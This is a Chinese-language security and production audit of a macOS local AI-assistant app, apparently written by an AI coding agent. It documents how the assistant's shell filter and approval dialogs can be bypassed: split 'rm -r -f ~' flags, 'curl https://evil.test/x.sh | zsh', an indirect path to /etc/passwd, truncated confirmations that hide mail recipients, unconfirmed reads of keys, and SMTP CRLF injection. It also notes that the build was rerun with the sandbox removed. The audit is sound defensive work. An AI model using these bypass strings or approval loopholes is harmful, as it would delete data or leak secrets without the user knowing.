# Lucas 生产级全盘审计（Cursor，2026-10-30）

> 说明：本文由 Cursor 写出。曾误写入 `docs/audit/devin-audit-2026-10-30.md`，现已改名。

- 范围：`/Users/w/Desktop/japlosv2/clone`（git 根）。HEAD `5246a10`（`Unify tool approval gate; harden shell roots; fix desktop-file scenes`）。tag `v0.5.4` = `61edced`，是 HEAD 的祖先。上一级 `analysis/`、`reconstructed/`、`snapshot/` 未读未改。
- 方式：只读。没有改产品代码、没有提交、没有跑 `scripts/publish.sh`，没有打开 `Config/release.env` 和 `.secrets`。
- 证据：`文件:行号`，或本机实际跑过的命令输出。推不出来的写「推测」。

---

## 0. 构建与测试

### `swift build`

第一次在沙箱里跑，失败，不是工程编译错误：

```
error: 'clone': Invalid manifest ...
sandbox-exec: sandbox_apply: Operation not permitted
SWIFT_BUILD_EXIT:1
```

第二次去掉沙箱后成功：

```
Build complete! (3.24秒)
SWIFT_BUILD_EXIT:0
```

4 条 Swift 6 警告，都是 `MemoryKnowledgeTools.swift` 里持有非 `Sendable` 的 `KernelStore`：第 17、62、95、146 行（`MemorySaveTool` / `MemorySearchTool` / `KnowledgeSearchTool` / `KnowledgeReadTool`）。Swift 5.9 语言模式下只是警告，切到 Swift 6 会变成错误。

### `swift test`

退出码 0。XCTest 20 个用例、0 失败：

| Target | 用例 | 结果 |
|---|---|---|
| JaplosProtocolTests | 11 | 通过 |
| JaplosKernelTests `DangerousCommandTests` | 5 | 通过 |
| JaplosRuntimeTests `SceneRouterRegressionTests` | 4 | 通过 |
| Swift Testing | 0 | 空跑通过 |

生产 Swift 约 2.1 万行，测试 3 个文件、约 245 行。通过不等于安全网有效：第 7 节说明这 20 个用例为什么挡不住下面的 P0。

---

## 1. 总评

**总分：4 / 10。** 骨架是一个能编译、能跑的本地助手：App 不链接 Kernel，Unix socket 有长度帧和同用户校验，高风险工具在流式对话里会弹出确认框，`tool.invoke` 不能绕过这道闸，模型密钥有从 SQLite 迁到 Keychain/0600 文件的路径，发版脚本会拒绝空的签名身份和公证配置。不能按生产代理发布，是因为官方聊天路径上仍有三条不需要用户看清后果就能改盘、删家目录或把邮件发出去的路，而且最新一次「加固 Shell 信任根」的提交和测试都没有挡住。

| 维度 | 分数 | 理由 |
|---|---|---|
| 架构 | 5 / 10 | `Package.swift` 依赖方向是 Protocol ← Kernel ← Runtime ← japlosd，JaplosApp 只依赖 Protocol 和 Sparkle，没有循环依赖。RPC 是 4 字节长度 + JSON，帧上限 16MB。代价是 `KernelCore.handle` 一个 switch 包掉几乎所有操作，`KernelStore` 同时是 59 张表的 CRUD，socket 层还直接挂着微信审批桥。`protocolVersion`、`deadline` 在信封里，分发时不检查。 |
| 可维护性 | 4 / 10 | `SettingsView.swift` 3561 行、`KernelStore.swift` 1986 行、`AppModel.swift` 1797 行、`CoreSurface.swift` 1355 行、`KernelCore.swift` 1169 行。59 张逻辑表里，本机库有 28 张 ledger 行数为 0，只有通用 RPC 能写。场景 JSON 的 `tools` 不裁剪模型工具集。 |
| 可靠性 | 4 / 10 | Shell 先等进程退出再读管道，输出一大就堵到超时。提醒只入库、到点不响。更新后只要旧 `lucasd` 还在听 socket，新 App 不会把它换掉。提示词种子「文件已存在就跳过」，已安装用户收不到提示词修复。迁移把版本 2–7 一次盖章，没有 `ALTER`、没有回滚。 |
| 安全 | 3 / 10 | 流式对话对 `risk == .high` 会要确认，`tool.invoke` 对同一闸直接拒绝。但 PDF 生成是低风险、无确认、可覆盖家目录里任意文件；Shell 的「审批也不能放行」过滤器用正则，拆开的 `rm -r -f ~`、`curl \| zsh`、不出现 `/etc` 字面量的读文件都放行；确认框只显示参数 JSON 前 400 字，危险尾巴和邮件的 `confirm`/`to` 会被正文挤出画面。 |

---

## 2. 问题清单

严重度：P0 = 会丢数据、安全控制被绕过，或官方 App 路径上用户无法知情。P1 = 真实缺陷，利用条件更窄或功能根本没接通。P2 = 维护、发版、加固。

工作量：S ≤ 1 天，M = 1–3 天，L > 3 天。

| 编号 | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议修法 | 工作量 |
|---|---|---|---|---|---|---|---|
| P0-1 | P0 | 安全 | `Sources/JaplosKernel/BuiltinTools.swift:69-84`，规则在 `514-542`，信任根在 `491-508` | Shell 声称信任根和危险命令是硬拒绝，审批也不能放宽。过滤是对命令字符串做正则。拆开的删除旗标、管道到 `zsh`、以及字符串里不出现 `/etc` 等绝对路径的写法都会放行，然后以 `/bin/zsh -lc` 执行。 | 同文件规则与下面的 Python 复现（用的是源码里的同一组正则，没有在本机执行这些命令）。`DangerousCommandTests` 只断言 `rm -rf /`、`curl \| bash` 会被拦。 | 不要用正则当安全边界。Shell 改为 `sandbox-exec` 或只允许 argv、禁止 `zsh -lc`。硬拒绝放到执行前的结构化检查（分离的 argv、realpath），单测覆盖下列字符串，要求返回非 nil。 | M |
| P0-2 | P0 | 安全 | `Sources/JaplosApp/AppModel.swift:1792-1796`；`Sources/JaplosProtocol/Framing.swift:111`；`Sources/JaplosApp/CoreSurface.swift:116-129`；`Sources/JaplosKernel/MailTools.swift:145-172`；`Sources/JaplosKernel/MailChannel.swift:396-461`；`Sources/JaplosKernel/MailIMAPSMTP.swift:184-189` | 确认框把整个参数 JSON 截到 400 字符。编码器 `sortedKeys`，所以键顺序是 `body`、`command` 在前，`confirm`、`to`、`subject` 在后。长正文会把「这是实发还是草稿、发给谁、命令后半段」挤出对话框。标题仍是「发送邮件」或「执行 Shell 命令」，用户点「允许执行」时看不到决定性字段。邮件在 `draft_only=false` 且 `confirm=true` 时走真实 SMTP。`RCPT TO:<…>` 不去掉 CR/LF，`to` 里夹换行会在同一条 TCP 流里多写出一条 SMTP 命令。 | `approvalSummary` 只 `prefix(400)`。`JSONEncoder.outputFormatting = [.sortedKeys]`。`MailChannel.send` 在 `gateBlocked = draftOnly \|\| !confirm` 为假时调用 `SMTPClient.send`。`writeLine("RCPT TO:<\(r)>")` 不对 `r` 做换行过滤。 | 确认框按字段展示：命令全文、收件人、`confirm`、`draft_only`、保存路径。超长则拒绝执行并要求模型缩短，而不是截断后仍允许。SMTP/IMAP 参数拒绝 CR/LF。`confirm` 不要由模型参数充当第二道闸，实发只认用户刚点过的那一次允许。 | M |
| P0-3 | P0 | 安全 / 丢数据 | `Sources/JaplosKernel/DocumentTools.swift:22-48`；`Sources/JaplosProtocol/Tools.swift:183-204`；`Sources/JaplosRuntime/ChatService.swift:194-217` | `system.document.pdf.create` 的 `risk` 是 `.low`，不在 `ToolApprovalGate` 的名字列表里。模型可以不经确认，把 PDF 写到信任根内任意路径，包括 `~/Library/Application Support/Lucas/kernel.sqlite3` 和 `secrets.json`。`CGContext` 会截断目标文件。 | 工具定义 `risk: .low`。闸门只在 `risk == .high` 或几个写死的工具名上返回 true。聊天循环在不需要审批时直接 `executeTool`。信任根包含整个主目录（`BuiltinTools.swift:458-464`）。 | 凡是落盘的工具一律高风险并走审批。PDF 默认只写 `~/Downloads`，禁止覆盖已有文件，路径再经 `TrustRoots` 之后还要拒绝 `Library/Application Support/Lucas` 和 `secrets.json`。 | S |
| P1-1 | P1 | 安全 | `Sources/JaplosProtocol/Tools.swift:187-192`；`Sources/JaplosKernel/BuiltinTools.swift:259-296`；`Sources/JaplosKernel/MailTools.swift:43-114`；`Sources/JaplosProtocol/JaplosProtocolTests.swift` 中 `testToolApprovalGateFilesystemWriteOnly` | 文件 `read`、剪贴板 `get`、`mail.list` / `mail.read` 不需要确认。信任根是整个主目录，所以无确认即可读 `~/.ssh`、`secrets.json`、飞书 `auth.sqlite`。邮件正文进入模型上下文。这是间接提示注入把密钥带进对话的入口。外发本身仍要再过一次闸，但密钥已经离开本地边界。 | 闸门对 `system.filesystem` 只在 `action == write` 时返回 true，协议测试把「读不需要审批」写成了期望。剪贴板只拦 `set`。邮件列表/阅读是 `.low`。本机 `secrets.json` 为 `-rw-------`，但同用户进程读得了；`feishu/credentials/auth.sqlite` 为 `-rw-r--r--`，表结构有 `secret` 列（`FeishuChannel.swift:412-429`）。`~/Library` 是 `drwx------`，其他 macOS 用户进不来。 | 读密钥路径、剪贴板、邮件正文改为需要确认，或对 `Library`、`.ssh`、`secrets.json`、`auth.sqlite` 硬拒绝。`auth.sqlite` 写成 0600，令牌只留在 `SecretStore`。 | M |
| P1-2 | P1 | 安全 | `Sources/JaplosKernel/MCPClient.swift:514-522`；`Sources/JaplosKernel/KernelCore.swift:1026-1048` | 每个 MCP 工具都被标成 `.medium`。闸门不拦 medium。聊天循环会直接执行。用户配置的 MCP 可以是任意 HTTP/stdio 工具，包括对外发送和本机命令。 | `risk: .medium` 写死在 `reload` 里。`ToolApprovalGate` 的 default 是 false。 | MCP 默认高风险，或按服务器配置显式降级。未知工具不许默认 medium。 | S |
| P1-3 | P1 | 安全 | `Sources/JaplosKernel/KernelCore.swift:815-818`、`858-867`；`Sources/JaplosKernel/UnixSocketServer.swift:451-470`；`Sources/JaplosKernel/PolicyEngine.swift:11-20`；`Sources/JaplosKernel/KernelStore.swift:836-843` | 审批闸只包住工具调用。`runtime.feishu.send_text` / `runtime.wechat.send_text` 是普通 RPC，同用户进程把 `principal` 填成 `local-user` 即可调用。bootstrap 授权是 `kernel.root`，匹配时 root 能力覆盖所有能力。Team ID 校验默认关闭。飞书这条 RPC 会真的打 Open API。微信 `sendText` 在缺少 iLink token 时不投递。 | `peerIsSameUser` 只比 uid。`peerTeamIDDenialReason` 在 `LUCAS_REQUIRE_TEAM_ID` 为空时直接返回 nil。`matchingGrant` 有 `capability == Capability.root`。App 的 `KernelClient` 默认 principal 就是 `local-user`（`KernelClient.swift:95`）。飞书 `sendTextAsync` 在 `FeishuChannel.swift:271-341`。微信不投递在 `WeChatChannel.swift:256-266`。 | 发布构建默认打开 Team ID。`principal` 由 socket 对端决定，不接受客户端字符串。通道外发 RPC 走同一套 `ToolApprovalGate`，没有审批流就拒绝。 | M |
| P1-4 | P1 | Bug | `Sources/JaplosApp/AppModel.swift:1160-1170`、`1443-1474`；`Sources/JaplosApp/SettingsView.swift:2897-2966` | 提醒和「未完成事项」闹钟只写入 `alarms` 表并在设置页显示。全仓库没有 `UNUserNotification`、没有到点调度。到了 `fireAt` 不会响。 | `rg` 只在 upsert/列表/设置 UI 出现 `fireAt`。本机 `alarms` 行数为 0，所以这是代码路径缺失，不是某一行坏数据。 | 用 `UNUserNotification` 或 daemon 定时器在 `fireAt` 触发；取消和改期要撤掉系统通知。 | M |
| P1-5 | P1 | 可靠性 | `Sources/JaplosKernel/BuiltinTools.swift:85-111` | Shell 把 stdout/stderr 接到 `Pipe`，在 `waitUntilExit` 之后才 `readDataToEndOfFile`。管道缓冲约 64KB，输出更大时子进程写阻塞、父进程等退出，直到 `timeoutSeconds`（最大 120）才 `SIGKILL`。循环用 `usleep`，不看 `Task.isCancelled`。点「停止」关的是客户端 socket（`KernelClient.swift:226-228`），杀不掉正在跑的命令。 | 上述行序：`process.run` → `usleep` 轮询 → `waitUntilExit` → 再读管道。`ChatService` 只在工具之间 `checkCancellation`（`ChatService.swift:191`）。 | 并发读管道并限制字节数；把子进程放进独立进程组，取消时杀组；`usleep` 改成可取消的等待。 | S |
| P1-6 | P1 | 生产 | `Sources/JaplosRuntime/PromptLibrary.swift:89-94`、`177-203`；`Sources/JaplosRuntime/SceneRouter.swift:75-78` | 提示词、场景、技能种子在目标文件已存在时直接 `continue` / `return false`。`load` 优先读 Application Support 覆盖，不读新包里的版本。Sparkle 更新了二进制，旧提示词仍生效。 | 注释写明 “does not overwrite existing files”。`seedScenesIfNeeded` 在 `scenes.json` 已存在时返回 false。 | 给种子带内容哈希或 schema 版本，内置文件变了就覆盖；用户改过的文件单独放在 `user/` 目录。 | S |
| P1-7 | P1 | 生产 | `Sources/JaplosApp/KernelClient.swift:267-272`；`Sources/JaplosApp/AppModel.swift:184-193` | `ensureRunning` 只要 `kernel.ping` 成功就返回。Sparkle 换掉 `.app` 之后，已经在跑的 `lucasd` 仍占着 socket（Unix 上进程拿着旧 inode）。新 App 启动不会拉起新 daemon。daemon 崩溃后，后续 RPC 也不会再调 `ensureRunning`，只有下次冷启动的 `bootstrap` 会。 | 全仓库只有 `bootstrap` 调用 `ensureRunning`。ping 成功即 return。 | 状态帧带上 daemon 的构建号，和 App 的 `CFBundleVersion` 不一致就停掉旧进程再拉起。RPC 失败时重试一次拉起。 | M |
| P1-8 | P1 | 安全 | `Sources/JaplosKernel/WeChatApprovalBridge.swift:50-60`、`383-422`；`Sources/JaplosKernel/WeChatChannel.swift:237-266`、`348-355` | 微信审批推送在配置缺省时默认开。解析把整句 `ok` / `y` / `yes` / `同意` 当成批准；多个待批时才要求 4 位短号。没有校验发送者。当前 `sendText` 在没有 iLink token 时不投递，`pollInboundTextMessages` 没有 token 就返回空数组，所以这条今天多半睡在那里。一旦凭据文件里出现 token，一句 “ok” 就能批准当时唯一的高风险工具。 | `isPushEnabled` 在读配置失败时 `return true`。`parseDecision` 的 approve 词表含 `yes`、`y`、`ok`。`sendText` 固定返回 `needsLiveILink` / `delivered: false`。 | 默认关闭推送。只接受带短号的「同意/拒绝」。核对发送者。在真正能投递之前，不要把微信当成审批通道。 | S |
| P1-9 | P1 | 测试 | `scripts/smoke_test.sh:45`；`Tests/JaplosKernelTests/DangerousCommandTests.swift`；`Tests/JaplosRuntimeTests/SceneRouterRegressionTests.swift:53-62` | 冒烟脚本仍要求 `kernel.status` 的 `"tools": 15`。本机 `~/Library/Logs/Lucas/lucasd.log` 在 `2026-10-30T09:24:28Z` 打出的工具名单是 41 个。危险命令测试不包含 P0-1 的绕过串，所以会保持绿色。场景测试在 `SceneRouter.match` 返回 nil 时跳过断言；场景加载还会读真实的 `~/Library/Application Support/Lucas/Injection/scenes.json`（`SceneRouter.swift:49-53`、`69-72`），测试不隔离。本次未重跑 `smoke_test.sh`。 | 日志拆分后工具数为 41。`smoke_test.sh` 第 45 行 `grep -q '"tools": 15'`。场景测试的 `if let scene`。 | 把工具数改成和注册表一致，或断言名单而不是魔法数字。给 P0-1 的每条绕过加一个必须失败的用例。测试用临时 `LUCAS_CLONE_HOME`。 | S |
| P1-10 | P1 | 生产 | `scripts/release.sh:27-32`；`scripts/build-app.sh:164-168` | `release.sh` 的报错文案要求 HTTPS appcast，检查却只拒绝空值和 `example.com`。`http://` 会进 `build-app.sh`，并给整个 App 加上 `NSAllowsArbitraryLoads`。 | 两个脚本的上述行。未读 `release.env`，不知道当前机器上的 feed 是不是 https。 | 发布脚本拒绝非 `https://`。本地 HTTP 只允许调试构建，且不要打开全局 ATS 例外。 | S |
| P2-1 | P2 | 架构 | `SettingsView.swift` 3561 行，`KernelStore.swift` 1986，`AppModel.swift` 1797，`CoreSurface.swift` 1355，`KernelCore.swift` 1169（`wc -l`） | 上帝文件。设置页、状态、持久化、RPC 分发缠在一起。改一个通道要同时动 UI 和 1000 行的 switch。 | `wc -l Sources/**/*.swift`。 | 按通道把设置页拆开；`KernelStore` 按表族拆文件；`handle` 按操作前缀分发到小类型。行为不变。 | L |
| P2-2 | P2 | 冗余 | `Sources/JaplosKernel/KernelStore.swift:1832-1860` | 28 张 runtime ledger 是同一形状的 `id/updated_at/record_json`。本机除业务表外这些表行数全是 0。代码里点名写入的只有 `feishu_messages`（`FeishuChannel.swift:179`、`322`），其余只靠 `runtime.ledger.upsert`。删掉它们，没有功能会跟着走，复杂度消失。 | `sqlite3` 对各表 `COUNT(*)`。`rg upsertRuntimeLedger` 只有 KernelCore 的通用 RPC 和飞书两处。 | 删掉无写入方的表和对应 RPC。飞书如果要留，单独一张表。 | M |
| P2-3 | P2 | 冗余 | `Sources/JaplosProtocol/KernelProtocol.swift:119-160`；App 调用点在 `AppModel.swift:1587-1780` | `wechat.login.*`、`mail.connection.*`、若干 `wechat.connection.*` 与 `runtime.*` 是别名，App 不用这些旧名字。`scripts/` 里也搜不到。删别名不会把复杂度转移到 App。 | App 只调用 `runtimeWeChat*`、`runtimeFeishu*`、`runtimeMail*`、`feishuConnectionConfigure`。 | 删别名 case。若还要兼容外部客户端，留一层显式 deprecated 列表，而不是在 switch 里永久双写。 | S |
| P2-4 | P2 | 模块化 | `Sources/JaplosRuntime/ChatService.swift:112-113`；`Sources/JaplosRuntime/SceneRouter.swift:132-162`；`Resources/Injection/scenes.json` 里 `keyboard-mouse` 的 `tools` 为空 | 场景匹配只往 system prompt 加一段话。模型始终拿到 `core.tools.definitions() + MCP` 的全量工具。`scenes.json` 里的工具白名单删了，执行能力不变，只少一段提示。键盘/鼠标场景引用的 `system.devices.*` 在 Swift 里不存在。 | `ChatService` 第 113 行。`rg system.devices` 在 `Sources` 无匹配。 | 要么按场景真正过滤工具，要么删掉 `tools` 字段，避免读代码的人以为它是权限边界。删掉没有对应工具的场景。 | S |
| P2-5 | P2 | 可靠性 | `Sources/JaplosKernel/KernelStore.swift:340-356`、`359-369`；全库无 `ALTER TABLE` | `persistence_migrations` 在每次启动把版本 2、3、4、5、6、7 各插入一次（已存在则跳过）。没有按版本差量改表，也没有回滚。本机这 6 个版本号都在。SQLite 是 WAL、`foreign_keys=ON`、`busy_timeout=5000`，单连接有锁，这一部分是好的。 | `CREATE TABLE IF NOT EXISTS` 循环和 `recordPersistenceMigration`。`sqlite3 ... SELECT version` 输出 `2` 到 `7`。 | 迁移改成有顺序的步骤函数，失败则中止启动；需要时保留上一份 sqlite 备份。不要在同一次启动把 2–7 全部标成已应用。 | M |
| P2-6 | P2 | 生产 | `Sources/JaplosApp/KernelClient.swift:290`；`~/Library/Logs/Lucas/lucasd.log` | 日志用 `FileHandle(forWritingTo:)`，不 `seekToEnd`，子进程 stderr 从偏移 0 写，会盖住旧日志。该文件 5 行里，`shutting down` 的时间戳是 `09:24:26`，却排在 `09:24:28 listening` 之后。崩溃处理只往 `/tmp/lucas-crash.log` 写信号号（`JaplosApp.swift:279-300`），daemon 没有对应处理。 | 打开方式见 `KernelClient.swift:290-292`。日志原文见该文件。 | 用 `O_APPEND`。日志放到 `~/Library/Logs/Lucas`，按大小滚动。崩溃至少留下异常名和调用栈。 | S |
| P2-7 | P2 | 生产 | `scripts/build-app.sh:16-17`、`171-176`；`Sources/JaplosKernel/KernelCore.swift:17`；`Sources/JaplosKernel/MCPClient.swift:140` | 版本有三套：构建默认营销号 `0.4.0`，daemon 常量 `1.0.0`（日志已打出 `lucasd 1.0.0`），MCP `clientInfo` 也是 `0.4.0`。线上 tag 是 `v0.5.4`。`CFBundleVersion` 默认是 `date +%Y%m%d%H%M`，本地构建的构建号会大于已发布的 `202610301026`（该构建号来自 `docs/PROJECT.md`，未在本次打开 appcast）。`codesign --force --deep` 把 App 的 entitlements（麦克风、Apple Events）签进整个包，包括 Sparkle 辅助程序。 | 上述行。`Config/Lucas.entitlements` 只有这两项。`git rev-parse v0.5.4` = `61edced`。 | 一个 `VERSION` 文件注入 plist、daemon、MCP。签名由内向外，`lucasd` 和 Sparkle XPC 不要共用 App entitlements，去掉 `--deep`。 | M |
| P2-8 | P2 | 安全 | `Sources/JaplosKernel/KernelCore.swift:118-122`；`Sources/JaplosKernel/ExtendedTools.swift:119`；`Sources/JaplosKernel/SystemInfoTools.swift:320`；`Sources/JaplosKernel/SecretStore.swift:47-60` | `handleStreaming` 的默认审批闭包是 `{ _, _ in true }`。当前 socket 路径有传入 `ApprovalBroker`，默认值今天没被用到，以后漏传就是静默放行。`system.audio` 的 `set` 和 `system.user.defaults` 的 `set` 是低风险，不确认就能改音量和 `com.lucas.app` 里以前缀匹配的键。Keychain 失败会退回 0600 的 `secrets.json`，并发 stderr，不让调用失败。 | 默认参数在 `KernelCore.swift:121`。`japlosd/main.swift:130-134` 确实传入了 broker。 | 去掉默认 `true`，改成必须传入。系统音量和偏好写入至少 medium 并确认。Keychain 失败在签名构建里应当失败，而不是悄悄落盘。 | S |
| P2-9 | P2 | 冗余 / Bug | `Sources/JaplosKernel/WeChatChannel.swift:237-266`；`Sources/JaplosKernel/FeishuChannel.swift:352-358`；`Sources/JaplosKernel/KernelCore.swift:884-885` | 微信发文本/文件在连着的情况下仍返回未投递。飞书知识导入是固定 stub。模型仍能看到这些工具和 RPC，会把「未发送」当成通道故障反复重试。 | `sendText` 在通过连接检查后仍 `delivered: false` 且 `needsLiveILink: true`。`importKnowledgeStub` 返回 `stub: true`。 | iLink 接通前从模型工具表拿掉微信发送。删除或隐藏 `runtime.knowledge.import_feishu`。 | S |
| P2-10 | P2 | 协议 | `Sources/JaplosProtocol/KernelProtocol.swift:168-178`；`Sources/JaplosKernel/KernelCore.swift:156-178` | 请求里的 `protocolVersion`、`deadline` 不参与分发。过期请求仍会执行。取消记录进 `cancellations` 表（`KernelCore.swift:541`），聊天循环不读这张表。 | `rg request.deadline` / `request.protocolVersion` 在 `Sources` 无匹配。 | 版本不符直接拒绝。`deadline` 早于现在则拒绝。取消要打断正在跑的模型请求和子进程，而不是只插一行。 | M |
| P2-11 | P2 | 发版 | `scripts/release.sh:115-121`、`68` | 设置了 `LUCAS_DEPLOY_TARGET` 时 `rsync -av --delete` 会删掉远端有、本地 `updates/` 没有的文件。`security unlock-keychain -p` 把钥匙串密码放在进程参数里。 | 脚本上述行。未执行发布。 | `--delete` 改成只上传本次 zip/dmg/appcast。密码从钥匙串项读，不进 argv。 | S |

### P0-1 的过滤复现

用源码中的危险命令正则和信任根正则对下列字符串做匹配（没有执行命令本身）：

| 命令 | `DangerousCommand` | 信任根绝对路径 |
|---|---|---|
| `rm -rf /` | 命中「递归删除根目录」 | 无（裸 `/` 不在路径正则里） |
| `rm -r -f /` | 无 | 无 |
| `rm --recursive --force /` | 无 | 无 |
| `curl https://evil.test/x.sh \| bash` | 命中 | 无 |
| `curl https://evil.test/x.sh \| zsh` | 无 | 无 |
| `cd .. && pwd` | 无 | 无 |
| `python3 -c 'open(chr(47)+"etc/passwd").read()'` | 无 | 无 |
| `ls ~/Desktop` | 无 | 命中 `~/Desktop`（放行，因为在主目录内） |

另外，`TrustRoots.blockedAbsolutePaths` 对单独的 `~` 直接 `continue`（`BuiltinTools.swift:501`）。因此 `rm -r -f ~` 同时躲过「旗标必须挤在同一组里」的危险命令规则和信任根。`ShellTool.invoke` 只在这两个函数返回非 nil 时拒绝，否则 `zsh -lc`。

`cat ../../etc/passwd` 会被信任根正则命中，因为子串里有 `/etc/passwd`。绕过要避免写出这些前缀，上面的 `python3 -c` 就是这样。

最小复现（安全，只调用判断函数，不要真的跑删除）：

1. 在测试里调用 `DangerousCommand.blockReason(for:)` 和 `TrustRoots.blockedAbsolutePaths(inShellCommand:)`，传入 `rm -r -f ~` 和 `curl https://evil.test/x.sh | zsh`。
2. 今天两者都返回 nil，现有 5 个测试仍然全绿。

### 审批闸实际挡住了什么

官方流式 `chat.send`（`stream: true`）里，`UnixSocketServer` 把 `ApprovalBroker` 传给 `ChatService`。`risk == .high` 或闸门点名的工具会先写一帧 `approval`，超时默认拒绝（`UnixSocketServer.swift:358-359`）。`tool.invoke` 对同一条件直接返回 `approval_required`，不执行（`KernelCore.swift:1089-1097`）。非流式 `chat.send` 的 `approval` 为 nil，高风险工具被拒绝（`ChatService.swift:207-214`）。

因此：模型不能靠 `tool.invoke` 偷偷跑 Shell。模型可以不确认就跑 PDF、文件读、剪贴板读、邮件读、全部 MCP、改音量。模型可以让用户在看不清参数尾巴的情况下批准 Shell 和实发邮件。另一个本机进程可以自己连 socket 并把审批回成 true，因为 Team ID 默认关、`principal` 自报。

邮件、微信、飞书外发：

- 邮件工具 `mail.send` 是高风险，流式对话会弹框。实发还要模型自己把 `confirm` 设为 true。没有单独的 `mail.send` RPC。
- 飞书工具是高风险；RPC `runtime.feishu.send_text` 不经过闸，且会真实 HTTP 发送。
- 微信工具是高风险；RPC 和工具最后都走到 `sendText`，当前实现不投递。

### 架构（简）

依赖方向合理，没有环。浅的部分不是 `PolicyEngine`（44 行，删掉只是把 grant 匹配搬进 `KernelCore`，复杂度转移，应保留）。浅的是：场景 `tools` 数组、28 张空 ledger、成对的 RPC 别名、飞书导入 stub、尚未投递的微信发送。

`KernelOperation` 是开放字符串，未知操作落到 `default` 返回 notFound（`KernelCore.swift:941-942`），这一点是好的。能力表的 `default` 却返回 `kernel.root`（`Policy.swift:163-165`）。今天未知操作在能力检查通过之后才会 notFound，而本地 root 授权本来就覆盖 root 能力，所以没有额外提权；以后如果有人在 switch 里加了操作、忘了在 `CapabilityRouting` 登记，它会要求 root 而不是一个更窄的能力。

---

## 3. 删除测试

| 候选 | 删掉之后 | 结论 |
|---|---|---|
| `PolicyEngine` | grant 匹配搬进 `KernelCore` | 保留。它薄，但是边界。 |
| `SceneRouter` 整体 | system prompt 少一段场景文案，工具集不变 | 保留路由，删掉或停止使用 `tools` 字段，除非改成真正的过滤。 |
| 28 张 ledger 里除 `feishu_messages` 以外的表，以及 `runtime.ledger.*` | 本机行数已是 0，没有功能读取方 | 删除。复杂度消失，不转移。 |
| `wechat.login.*`、`mail.connection.*` 等别名 | App 和 `scripts/` 不引用 | 删除。 |
| `runtime.knowledge.import_feishu` | 少一个永远返回 stub 的 RPC | 删除。 |
| 微信 `send_text` / `send_file` 工具 | 少两个必然 `delivered: false` 的工具 | 在 iLink 接通前从模型工具表移除。通道状态可以留。 |
| `keyboard-mouse` 等空工具场景 | 少一段没有对应实现的提示 | 删除。 |

---

## 4. 测试覆盖

覆盖到了：帧编解码、JSON 往返、glob、grant 过期、三条审批闸规则（高风险必拦、文件写才拦、若干外发名字必拦）、危险命令的几条「明显」样例、桌面文案不要匹配截屏正则。

没覆盖：Shell 绕过、审批摘要截断、PDF 无确认写盘、邮件实发条件、SMTP/IMAP 换行、socket 同用户/Team ID、SQLite 迁移、MCP 风险、闹钟到点、daemon 重启、Sparkle。

没有发现「断言恒为 true」那种假测试。假的是安全感：`DangerousCommandTests` 全绿，同时 P0-1 的字符串放行。`testFrameTooLargeIsRejected` 自己注释写了只检查头长度，并不调用 `readFrame`（`JaplosProtocolTests.swift:13-18`）。

---

## 5. 运行时佐证（只读）

- `~/Library` 为 `drwx------`，其他 macOS 用户进不去。`Application Support/Lucas` 是 `drwxr-xr-x`。
- `kernel.sock` 为 `srw-------`。`kernel.sqlite3` 与 `feishu/credentials/auth.sqlite` 为 `-rw-r--r--`。`secrets.json` 为 `-rw-------`，大小 4 字节。
- 逻辑表 59 张（源码 `CREATE TABLE` 31 张 + ledger 28 张）。FTS5 影子表另计。`auth_profile_store` 行数 0。`persistence_migrations` 版本为 2–7。
- 行数非 0 的业务表：`configurations` 2、`configuration_history` 2、`permission_grants` 1、`sessions` 1、`turns` 2、`tool_invocations` 19、`mcp_events` 26、`self_healing_events` 26、`persistence_migrations` 6。ledger、`alarms`、`memories`、`knowledge_*`、`wechat_connections` 均为 0。`knowledge_fts` 的 `COUNT(*)` 在这次查询里报错（虚表，未再展开）。
- `lucasd.log` 只有 5 行，版本字符串是 `lucasd 1.0.0`，工具 41 个，MCP 0。`shutting down` 时间戳早于同文件里的 `listening` 却排在后面。

---

## 6. 前 10 项优先修复

1. **P0-1** 拆掉「正则即沙箱」。Shell 用系统沙箱或 argv，并为 `rm -r -f ~`、`curl | zsh`、`python3` 拼接路径补上必须变红的测试。
2. **P0-2** 确认框展示结构化字段，禁止截断后仍执行。邮件实发只认用户点击，不认模型传入的 `confirm`。SMTP/IMAP 拒绝换行。
3. **P0-3** PDF 和一切落盘改为必须审批，并禁止覆盖数据库和密钥文件。
4. **P1-1** 无确认的读取面收口：密钥路径、剪贴板、邮件正文。飞书令牌不要写入 0644 的 sqlite。
5. **P1-2** MCP 工具默认要审批。
6. **P1-3** 发布包打开 Team ID；`principal` 绑定 socket 对端；飞书/微信发送 RPC 走同一闸。
7. **P1-5** 修 Shell 管道死锁，停止按钮要杀掉进程组。
8. **P1-4** 闹钟接到系统通知，到点要响，删除要撤。
9. **P1-6 + P1-7** 提示词按版本覆盖；App 更新后按构建号重启 `lucasd`。
10. **P1-9** 修正冒烟脚本的工具数，把 P0 绕过加进 `DangerousCommandTests`，测试不要读开发者主目录里的 `scenes.json`。

## 7. 建议删除

- 27 张从未写入的 ledger 表，以及只为它们存在的 `runtime.ledger.list/upsert/delete`（若飞书消息还要留，单独保留 `feishu_messages`）。
- App 和脚本都未使用的 `wechat.login.*`、`mail.connection.*` 等操作别名。
- `runtime.knowledge.import_feishu` stub。
- 在能真正投递之前，从模型工具表移除 `runtime.wechat.send_text` 和 `runtime.wechat.send_file`。
- `scenes.json` 里没有对应 Swift 工具的场景（例如键盘/鼠标，`tools: []`）。
- 不要删 `PolicyEngine`、`SecretStore`、`ToolApprovalGate`、帧协议。它们删了只是把判断搬进更大的文件。

---

## 8. 本次没有做的事

- 没有对真实 IMAP/SMTP、飞书、微信发一封信或一条消息。外发结论来自调用链，不是线上投递。
- 没有执行会删文件或读 `/etc/passwd` 的 Shell。P0-1 只跑了与源码相同的正则。
- 没有打开 `Config/release.env`、`.secrets`，也没有跑 `publish.sh`。因此不能断言当前钥匙串里的公证配置是否有效，只能审计脚本在什么条件下会放行或拒绝。
- `osascript` 对 `\"` 会当成字符串内的引号（本机 `osascript -e 'return "hello\"world"'` 输出 `hello"world`，`return "a\" & \"b"'` 输出 `a" & "b`，`&` 没有变成运算符）。通知工具的引号转义在这次探测下没有变成命令注入，所以没有把它列为漏洞。
